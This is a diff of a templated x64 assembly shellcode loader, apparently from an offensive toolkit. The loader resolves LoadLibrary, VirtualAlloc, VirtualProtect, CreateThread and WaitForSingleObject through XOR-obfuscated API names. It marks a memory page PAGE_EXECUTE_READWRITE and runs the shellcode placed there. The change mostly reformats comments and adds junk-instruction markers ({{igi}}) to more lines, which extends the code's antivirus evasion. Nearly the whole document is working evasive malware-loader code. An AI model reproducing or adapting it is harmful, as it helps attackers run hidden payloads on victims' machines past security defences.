@@ -27,21 +27,21 @@ entry:
 
 {{if .LackProcedure}}
   // push kernel32 module name to stack
-  mov {{.Reg.rax}}, {{index .Kernel32DLLDB 0}}                 {{igi}}
+  mov {{.Reg.rax}}, {{index .Kernel32DLLDB  0}}                {{igi}}
   mov {{.Reg.r8}},  {{index .Kernel32DLLKey 0}}                {{igi}}
   xor {{.Reg.rax}}, {{.Reg.r8}}                                {{igi}}
   push {{.Reg.rax}}                                            {{igi}}
-  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB 1}}                 {{igi}}
+  mov {{.Reg.rbx}}, {{index .Kernel32DLLDB  1}}                {{igi}}
   mov {{.Reg.r9}},  {{index .Kernel32DLLKey 1}}                {{igi}}
   xor {{.Reg.rbx}}, {{.Reg.r9}}                                {{igi}}
   push {{.Reg.rbx}}                                            {{igi}}
 
   {{if .LoadLibraryWOnly}}
-    mov {{.Reg.rcx}}, {{index .Kernel32DLLDB 2}}               {{igi}}
+    mov {{.Reg.rcx}}, {{index .Kernel32DLLDB  2}}              {{igi}}
     mov {{.Reg.r10}}, {{index .Kernel32DLLKey 2}}              {{igi}}
     xor {{.Reg.rcx}}, {{.Reg.r10}}                             {{igi}}
     push {{.Reg.rcx}}                                          {{igi}}
-    mov {{.Reg.rdx}}, {{index .Kernel32DLLDB 3}}               {{igi}}
+    mov {{.Reg.rdx}}, {{index .Kernel32DLLDB  3}}              {{igi}}
     mov {{.Reg.r11}}, {{index .Kernel32DLLKey 3}}              {{igi}}
     xor {{.Reg.rdx}}, {{.Reg.r11}}                             {{igi}}
     push {{.Reg.rdx}}                                          {{igi}}
@@ -60,10 +60,10 @@ entry:
   mov {{.RegN.rbx}}, [{{.RegN.rbx}}]                           {{igi}}
 
   // load kernel32.dll
-  mov rcx, rsp          // lpLibFileName                       {{igi}}
-  sub rsp, 0x20         // reserve stack for call convention   {{igi}}
-  call {{.RegN.rbx}}    // call LoadLibraryA/W                 {{igi}}
-  add rsp, 0x20         // restore stack for call convention   {{igi}}
+  mov rcx, rsp         {{igi}} // lpLibFileName
+  sub rsp, 0x20        {{igi}} // reserve stack for call convention
+  call {{.RegN.rbx}}   {{igi}} // call LoadLibraryA/W
+  add rsp, 0x20        {{igi}} // restore stack for call convention
 
   // store the handle of kernel32.dll
   mov {{.RegN.rsi}}, rax                                       {{igi}}
@@ -83,83 +83,83 @@ entry:
   // get procedure address of VirtualAlloc
   {{if .LackVirtualAlloc}}
     // push procedure name to stack
-    mov {{.RegV.rax}}, {{index .VirtualAllocDB 0}}              {{igi}}
-    mov {{.RegV.r8}},  {{index .VirtualAllocKey 0}}             {{igi}}
-    xor {{.RegV.rax}}, {{.RegV.r8}}                             {{igi}}
-    push {{.RegV.rax}}                                          {{igi}}
-    mov {{.RegV.rcx}}, {{index .VirtualAllocDB 1}}              {{igi}}
-    mov {{.RegV.r9}},  {{index .VirtualAllocKey 1}}             {{igi}}
-    xor {{.RegV.rcx}}, {{.RegV.r9}}                             {{igi}}
-    push {{.RegV.rcx}}                                          {{igi}}
-    mov rcx, {{.RegN.rsi}} // hModule                           {{igi}}
-    mov rdx, rsp           // lpProcName                        {{igi}}
-    sub rsp, 0x20          // reserve stack for call convention {{igi}}
-    call {{.RegN.rbp}}     // call GetProcAddress               {{igi}}
-    add rsp, 0x20          // restore stack for call convention {{igi}}
+    mov {{.RegV.rax}}, {{index .VirtualAllocDB  0}}            {{igi}}
+    mov {{.RegV.r8}},  {{index .VirtualAllocKey 0}}            {{igi}}
+    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{igi}}
+    push {{.RegV.rax}}                                         {{igi}}
+    mov {{.RegV.rcx}}, {{index .VirtualAllocDB  1}}            {{igi}}
+    mov {{.RegV.r9}},  {{index .VirtualAllocKey 1}}            {{igi}}
+    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
+    push {{.RegV.rcx}}                                         {{igi}}
+    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
+    mov rdx, rsp             {{igi}} // lpProcName
+    sub rsp, 0x20            {{igi}} // reserve stack for call convention
+    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
+    add rsp, 0x20            {{igi}} // restore stack for call convention
     // restore stack for procedure name
-    add rsp, 2*8                                                {{igi}}
+    add rsp, 2*8                                               {{igi}}
     // store procedure address to stack
-    mov [rsp+0x10], rax                                         {{igi}}
+    mov [rsp+0x10], rax                                        {{igi}}
   {{else}}
-    mov {{.RegV.rcx}}, {{.RegN.rdi}}                            {{igi}}
-    add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                    {{igi}}
-    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                          {{igi}}
-    mov [rsp+0x10], {{.RegV.rcx}}                               {{igi}}
+    mov {{.RegV.rcx}}, {{.RegN.rdi}}                           {{igi}}
+    add {{.RegV.rcx}}, {{hex .VirtualAlloc}}                   {{igi}}
+    mov {{.RegV.rcx}}, [{{.RegV.rcx}}]                         {{igi}}
+    mov [rsp+0x10], {{.RegV.rcx}}                              {{igi}}
   {{end}}
 
   // get procedure address of VirtualProtect
   {{if .LackVirtualProtect}}
     // push procedure name to stack
-    mov {{.RegV.rax}}, {{index .VirtualProtectDB 0}}            {{igi}}
-    mov {{.RegV.r8}},  {{index .VirtualProtectKey 0}}           {{igi}}
-    xor {{.RegV.rax}}, {{.RegV.r8}}                             {{igi}}
-    push {{.RegV.rax}}                                          {{igi}}
-    mov {{.RegV.rcx}}, {{index .VirtualProtectDB 1}}            {{igi}}
-    mov {{.RegV.r9}},  {{index .VirtualProtectKey 1}}           {{igi}}
-    xor {{.RegV.rcx}}, {{.RegV.r9}}                             {{igi}}
-    push {{.RegV.rcx}}                                          {{igi}}
-    mov rcx, {{.RegN.rsi}} // hModule                           {{igi}}
-    mov rdx, rsp           // lpProcName                        {{igi}}
-    sub rsp, 0x20          // reserve stack for call convention {{igi}}
-    call {{.RegN.rbp}}     // call GetProcAddress               {{igi}}
-    add rsp, 0x20          // restore stack for call convention {{igi}}
+    mov {{.RegV.rax}}, {{index .VirtualProtectDB  0}}          {{igi}}
+    mov {{.RegV.r8}},  {{index .VirtualProtectKey 0}}          {{igi}}
+    xor {{.RegV.rax}}, {{.RegV.r8}}                            {{igi}}
+    push {{.RegV.rax}}                                         {{igi}}
+    mov {{.RegV.rcx}}, {{index .VirtualProtectDB  1}}          {{igi}}
+    mov {{.RegV.r9}},  {{index .VirtualProtectKey 1}}          {{igi}}
+    xor {{.RegV.rcx}}, {{.RegV.r9}}                            {{igi}}
+    push {{.RegV.rcx}}                                         {{igi}}
+    mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
+    mov rdx, rsp             {{igi}} // lpProcName
+    sub rsp, 0x20            {{igi}} // reserve stack for call convention
+    call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
+    add rsp, 0x20            {{igi}} // restore stack for call convention
     // restore stack for procedure name
-    add rsp, 2*8                                                {{igi}}
+    add rsp, 2*8                                               {{igi}}
     // store procedure address to stack
-    mov [rsp+0x20], rax                                         {{igi}}
+    mov [rsp+0x20], rax                                        {{igi}}
   {{else}}
-    mov {{.RegV.rdx}}, {{.RegN.rdi}}                            {{igi}}
-    add {{.RegV.rdx}}, {{hex .VirtualProtect}}                  {{igi}}
-    mov {{.RegV.rdx}}, [{{.RegV.rdx}}]                          {{igi}}
-    mov [rsp+0x20], {{.RegV.rdx}}                               {{igi}}
+    mov {{.RegV.rdx}}, {{.RegN.rdi}}                           {{igi}}
+    add {{.RegV.rdx}}, {{hex .VirtualProtect}}                 {{igi}}
+    mov {{.RegV.rdx}}, [{{.RegV.rdx}}]                         {{igi}}
+    mov [rsp+0x20], {{.RegV.rdx}}                              {{igi}}
   {{end}}
 
   // get procedure address of CreateThread
   {{if .NeedCreateThread}}
     {{if .LackCreateThread}}
       // push procedure name to stack
-      mov {{.RegV.rax}}, {{index .CreateThreadDB 0}}              {{igi}}
-      mov {{.RegV.r8}},  {{index .CreateThreadKey 0}}             {{igi}}
-      xor {{.RegV.rax}}, {{.RegV.r8}}                             {{igi}}
-      push {{.RegV.rax}}                                          {{igi}}
-      mov {{.RegV.rcx}}, {{index .CreateThreadDB 1}}              {{igi}}
-      mov {{.RegV.r9}},  {{index .CreateThreadKey 1}}             {{igi}}
-      xor {{.RegV.rcx}}, {{.RegV.r9}}                             {{igi}}
-      push {{.RegV.rcx}}                                          {{igi}}
-      mov rcx, {{.RegN.rsi}} // hModule                           {{igi}}
-      mov rdx, rsp           // lpProcName                        {{igi}}
-      sub rsp, 0x20          // reserve stack for call convention {{igi}}
-      call {{.RegN.rbp}}     // call GetProcAddress               {{igi}}
-      add rsp, 0x20          // restore stack for call convention {{igi}}
+      mov {{.RegV.rax}}, {{index .CreateThreadDB  0}}          {{igi}}
+      mov {{.RegV.r8}},  {{index .CreateThreadKey 0}}          {{igi}}
+      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{igi}}
+      push {{.RegV.rax}}                                       {{igi}}
+      mov {{.RegV.rcx}}, {{index .CreateThreadDB  1}}          {{igi}}
+      mov {{.RegV.r9}},  {{index .CreateThreadKey 1}}          {{igi}}
+      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{igi}}
+      push {{.RegV.rcx}}                                       {{igi}}
+      mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
+      mov rdx, rsp             {{igi}} // lpProcName
+      sub rsp, 0x20            {{igi}} // reserve stack for call convention
+      call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
+      add rsp, 0x20            {{igi}} // restore stack for call convention
       // restore stack for procedure name
-      add rsp, 2*8                                                {{igi}}
+      add rsp, 2*8                                             {{igi}}
       // store procedure address to stack
-      mov [rsp+0x28], rax                                         {{igi}}
+      mov [rsp+0x28], rax                                      {{igi}}
     {{else}}
-      mov {{.RegV.r8}}, {{.RegN.rdi}}                             {{igi}}
-      add {{.RegV.r8}}, {{hex .CreateThread}}                     {{igi}}
-      mov {{.RegV.r8}}, [{{.RegV.r8}}]                            {{igi}}
-      mov [rsp+0x28], {{.RegV.r8}}                                {{igi}}
+      mov {{.RegV.r8}}, {{.RegN.rdi}}                          {{igi}}
+      add {{.RegV.r8}}, {{hex .CreateThread}}                  {{igi}}
+      mov {{.RegV.r8}}, [{{.RegV.r8}}]                         {{igi}}
+      mov [rsp+0x28], {{.RegV.r8}}                             {{igi}}
     {{end}}
   {{end}}
 
@@ -167,34 +167,34 @@ entry:
   {{if .NeedWaitThread}}
     {{if .LackWaitForSingleObject}}
       // ensure stack is 16 bytes aligned
-      push {{.RegV.rax}}                                          {{igi}}
+      push {{.RegV.rax}}                                       {{igi}}
       // push procedure name to stack
-      mov {{.RegV.rax}}, {{index .WaitForSingleObjectDB 0}}       {{igi}}
-      mov {{.RegV.r8}},  {{index .WaitForSingleObjectKey 0}}      {{igi}}
-      xor {{.RegV.rax}}, {{.RegV.r8}}                             {{igi}}
-      push {{.RegV.rax}}                                          {{igi}}
-      mov {{.RegV.rcx}}, {{index .WaitForSingleObjectDB 1}}       {{igi}}
-      mov {{.RegV.r9}},  {{index .WaitForSingleObjectKey 1}}      {{igi}}
-      xor {{.RegV.rcx}}, {{.RegV.r9}}                             {{igi}}
-      push {{.RegV.rcx}}                                          {{igi}}
-      mov {{.RegV.rdx}}, {{index .WaitForSingleObjectDB 2}}       {{igi}}
-      mov {{.RegV.r10}}, {{index .WaitForSingleObjectKey 2}}      {{igi}}
-      xor {{.RegV.rdx}}, {{.RegV.r10}}                            {{igi}}
-      push {{.RegV.rdx}}                                          {{igi}}
-      mov rcx, {{.RegN.rsi}} // hModule                           {{igi}}
-      mov rdx, rsp           // lpProcName                        {{igi}}
-      sub rsp, 0x20          // reserve stack for call convention {{igi}}
-      call {{.RegN.rbp}}     // call GetProcAddress               {{igi}}
-      add rsp, 0x20          // restore stack for call convention {{igi}}
+      mov {{.RegV.rax}}, {{index .WaitForSingleObjectDB  0}}   {{igi}}
+      mov {{.RegV.r8}},  {{index .WaitForSingleObjectKey 0}}   {{igi}}
+      xor {{.RegV.rax}}, {{.RegV.r8}}                          {{igi}}
+      push {{.RegV.rax}}                                       {{igi}}
+      mov {{.RegV.rcx}}, {{index .WaitForSingleObjectDB  1}}   {{igi}}
+      mov {{.RegV.r9}},  {{index .WaitForSingleObjectKey 1}}   {{igi}}
+      xor {{.RegV.rcx}}, {{.RegV.r9}}                          {{igi}}
+      push {{.RegV.rcx}}                                       {{igi}}
+      mov {{.RegV.rdx}}, {{index .WaitForSingleObjectDB  2}}   {{igi}}
+      mov {{.RegV.r10}}, {{index .WaitForSingleObjectKey 2}}   {{igi}}
+      xor {{.RegV.rdx}}, {{.RegV.r10}}                         {{igi}}
+      push {{.RegV.rdx}}                                       {{igi}}
+      mov rcx, {{.RegN.rsi}}   {{igi}} // hModule
+      mov rdx, rsp             {{igi}} // lpProcName
+      sub rsp, 0x20            {{igi}} // reserve stack for call convention
+      call {{.RegN.rbp}}       {{igi}} // call GetProcAddress
+      add rsp, 0x20            {{igi}} // restore stack for call convention
       // restore stack for procedure name
-      add rsp, 4*8                                                {{igi}}
+      add rsp, 4*8                                             {{igi}}
       // store procedure address to stack
-      mov [rsp+0x30], rax                                         {{igi}}
+      mov [rsp+0x30], rax                                      {{igi}}
     {{else}}
-      mov {{.RegV.r9}}, {{.RegN.rdi}}                             {{igi}}
-      add {{.RegV.r9}}, {{hex .WaitForSingleObject}}              {{igi}}
-      mov {{.RegV.r9}}, [{{.RegV.r9}}]                            {{igi}}
-      mov [rsp+0x30], {{.RegV.r9}}                                {{igi}}
+      mov {{.RegV.r9}}, {{.RegN.rdi}}                          {{igi}}
+      add {{.RegV.r9}}, {{hex .WaitForSingleObject}}           {{igi}}
+      mov {{.RegV.r9}}, [{{.RegV.r9}}]                         {{igi}}
+      mov [rsp+0x30], {{.RegV.r9}}                             {{igi}}
     {{end}}
   {{end}}
 
@@ -234,51 +234,51 @@ entry:
 // ================================ prepare memory page ================================
 
   // allocate memory for shellcode
-  mov rax, [rsp+0x10]             // address of VirtualAddress               {{igi}}
-  xor rcx, rcx                    // lpAddress                               {{igi}}
-  mov rdx, {{hex .MemRegionSize}} // dwSize                                  {{igi}}
-  mov r8, 0x3000                  // flAllocationType MEM_RESERVE|MEM_COMMIT {{igi}}
-  mov r9, 0x04                    // flProtect PAGE_READWRITE                {{igi}}
-  sub rsp, 0x20                   // reserve stack for call convention       {{igi}}
-  call rax                        // call GetProcAddress                     {{igi}}
-  add rsp, 0x20                   // restore stack for call convention       {{igi}}
+  mov rax, [rsp+0x10]                          {{igi}} // address of VirtualAddress
+  xor rcx, rcx                                 {{igi}} // lpAddress
+  mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
+  mov r8, 0x3000                               {{igi}} // flAllocationType MEM_RESERVE|MEM_COMMIT
+  mov r9, 0x04                                 {{igi}} // flProtect PAGE_READWRITE
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call rax                                     {{igi}} // call GetProcAddress
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
 
   // store allocated memory address
-  mov [rsp+0x08], rax                                                        {{igi}}
+  mov [rsp+0x08], rax                          {{igi}}
 
   // padding garbage data to page
-  mov {{.RegV.rdx}}, rax
-  mov {{.RegV.rcx}}, {{hex .EntryOffset}}
+  mov {{.RegV.rdx}}, rax                       {{igi}}
+  mov {{.RegV.rcx}}, {{hex .EntryOffset}}      {{igi}}
   // calculate a random seed from registers
-  add {{.RegV.rax}}, {{.Reg.rbx}}
-  add {{.RegV.rax}}, {{.Reg.rcx}}
-  add {{.RegV.rax}}, {{.Reg.rdx}}
-  add {{.RegV.rax}}, {{.Reg.rsi}}
-  add {{.RegV.rax}}, {{.Reg.rdi}}
-  add {{.RegV.rax}}, {{.Reg.r8}}
-  add {{.RegV.rax}}, {{.Reg.r9}}
-  add {{.RegV.rax}}, {{.Reg.r10}}
-  add {{.RegV.rax}}, {{.Reg.r11}}
+  add {{.RegV.rax}}, {{.Reg.rbx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rcx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rdx}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rsi}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.rdi}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r8}}               {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r9}}               {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r10}}              {{igi}}
+  add {{.RegV.rax}}, {{.Reg.r11}}              {{igi}}
  loop_padding:
   // it will waste some loop but clean code
-  call xor_shift
-  mov [{{.RegV.rdx}}], {{.RegV.rax}}
+  call xor_shift                               {{igi}}
+  mov [{{.RegV.rdx}}], {{.RegV.rax}}           {{igi}}
   // check padding garbage is finish
-  inc {{.RegV.rdx}}
-  dec {{.RegV.rcx}}
-  jnz loop_padding
+  inc {{.RegV.rdx}}                            {{igi}}
+  dec {{.RegV.rcx}}                            {{igi}}
+  jnz loop_padding                             {{igi}}
 
   // adjust memory region protect
-  mov rax, [rsp+0x20]
-  mov rcx, [rsp+0x08]
-  sub rsp, 0x10 // for store old protect
-  mov rdx, {{hex .MemRegionSize}}
-  mov r8, 0x40 // PAGE_EXECUTE_READWRITE
-  mov r9, rsp
-  sub rsp, 0x20
-  call rax
-  add rsp, 0x20
-  add rsp, 0x10 // restore stack
+  mov rax, [rsp+0x20]                          {{igi}} // address of VirtualProtect
+  mov rcx, [rsp+0x08]                          {{igi}} // lpAddress
+  sub rsp, 0x10                                {{igi}} // for store old protect
+  mov rdx, {{hex .MemRegionSize}}              {{igi}} // dwSize
+  mov r8, 0x40                                 {{igi}} // flNewProtect PAGE_EXECUTE_READWRITE
+  mov r9, rsp                                  {{igi}} // lpflOldProtect
+  sub rsp, 0x20                                {{igi}} // reserve stack for call convention
+  call rax                                     {{igi}} // call GetProcAddress
+  add rsp, 0x20                                {{igi}} // restore stack for call convention
+  add rsp, 0x10                                {{igi}} // restore stack for old protect
 
 // ================================= prepare shellcode =================================
 
@@ -332,39 +332,39 @@ entry:
 // ================================== execute shellcode ==================================
 
 {{if .NeedCreateThread}}
-  mov rax, [rsp+0x28]            // address of CreateThread
-  mov r10, [rsp+0x08]            // address of memory page
-  add r10, {{hex .EntryOffset}}  // address of shellcode
+  mov rax, [rsp+0x28]            {{igi}} // address of CreateThread
+  mov r10, [rsp+0x08]            {{igi}} // address of memory page
+  add r10, {{hex .EntryOffset}}  {{igi}} // address of shellcode
 
-  sub rsp, 0x10                  // reserve stack for argument
-  xor rcx, rcx                   // lpThreadAttributes
-  xor rdx, rdx                   // dwStackSize
-  mov r8, r10                    // lpStartAddress
-  xor r9, r9                     // lpParameter
-  mov [rsp+0], rcx               // dwCreationFlags
-  mov [rsp+8], rcx               // lpThreadId
-  sub rsp, 0x20                  // reserve stack for call convention
-  call rax                       // call CreateThread
-  add rsp, 0x20                  // restore stack for call convention
-  add rsp, 0x10                  // restore stack for argument
+  sub rsp, 0x10                  {{igi}} // reserve stack for argument
+  xor rcx, rcx                   {{igi}} // lpThreadAttributes
+  xor rdx, rdx                   {{igi}} // dwStackSize
+  mov r8, r10                    {{igi}} // lpStartAddress
+  xor r9, r9                     {{igi}} // lpParameter
+  mov [rsp+0], rcx               {{igi}} // dwCreationFlags
+  mov [rsp+8], rcx               {{igi}} // lpThreadId
+  sub rsp, 0x20                  {{igi}} // reserve stack for call convention
+  call rax                       {{igi}} // call CreateThread
+  add rsp, 0x20                  {{igi}} // restore stack for call convention
+  add rsp, 0x10                  {{igi}} // restore stack for argument
 
   {{if .NeedWaitThread}}
-    mov rcx, rax                 // hHandle, hThread
-    mov rdx, 0xFFFFFFFF          // dwMilliseconds, INFINITE
-    mov rax, [rsp+0x30]          // address of WaitForSingleObject
+    mov rcx, rax                 {{igi}} // hHandle, hThread
+    mov rdx, 0xFFFFFFFF          {{igi}} // dwMilliseconds, INFINITE
+    mov rax, [rsp+0x30]          {{igi}} // address of WaitForSingleObject
 
-    sub rsp, 0x20                // reserve stack for call convention
-    call rax                     // call WaitForSingleObject
-    add rsp, 0x20                // restore stack for call convention
+    sub rsp, 0x20                {{igi}} // reserve stack for call convention
+    call rax                     {{igi}} // call WaitForSingleObject
+    add rsp, 0x20                {{igi}} // restore stack for call convention
   {{end}}
 {{else}}
   // get the shellcode entry point
-  mov {{.RegV.rax}}, [rsp+0x08]
-  add {{.RegV.rax}}, {{hex .EntryOffset}}
+  mov {{.RegV.rax}}, [rsp+0x08]                                {{igi}}
+  add {{.RegV.rax}}, {{hex .EntryOffset}}                      {{igi}}
   // call the shellcode
-  sub rsp, 0x20
-  call {{.RegV.rax}}
-  add rsp, 0x20
+  sub rsp, 0x20                                                {{igi}}
+  call {{.RegV.rax}}                                           {{igi}}
+  add rsp, 0x20                                                {{igi}}
 {{end}}
 
 // ================================== clean environment ==================================
